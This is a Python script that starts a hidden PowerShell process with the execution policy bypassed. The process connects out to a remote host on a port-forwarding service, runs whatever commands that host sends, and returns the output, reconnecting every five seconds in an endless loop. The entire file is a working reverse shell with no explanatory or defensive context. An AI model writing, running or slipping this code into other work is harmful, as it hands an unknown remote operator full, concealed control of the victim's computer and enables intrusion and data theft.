import subprocess

cmd = (
    'powershell -nop -W hidden -noni -ep bypass -c "'
    '$ErrorActionPreference = \'SilentlyContinue\'; '
    'function Start-Connection { '
    '$TCPClient = New-Object Net.Sockets.TCPClient(\'htps-http-20391.portmap.host\', 20391); '
    '$NetworkStream = $TCPClient.GetStream(); '
    '$StreamWriter = New-Object IO.StreamWriter($NetworkStream); '
    '$Buffer = New-Object byte[] $TCPClient.ReceiveBufferSize; '
    'function WriteToStream ($String) { '
    '$StreamWriter.Write($String + \'SHELL> \'); '
    '$StreamWriter.Flush() '
    '} '
    'WriteToStream \'\'; '
    'while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { '
    '$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead); '
    '$Output = try { Invoke-Expression $Command 2>&1 | Out-String } catch { $_ | Out-String }; '
    'WriteToStream ($Output) '
    '} '
    '$StreamWriter.Close(); '
    '}; '
    'while ($true) { '
    'try { Start-Connection } catch { Start-Sleep -Seconds 5 } '
    '} "'
)

subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
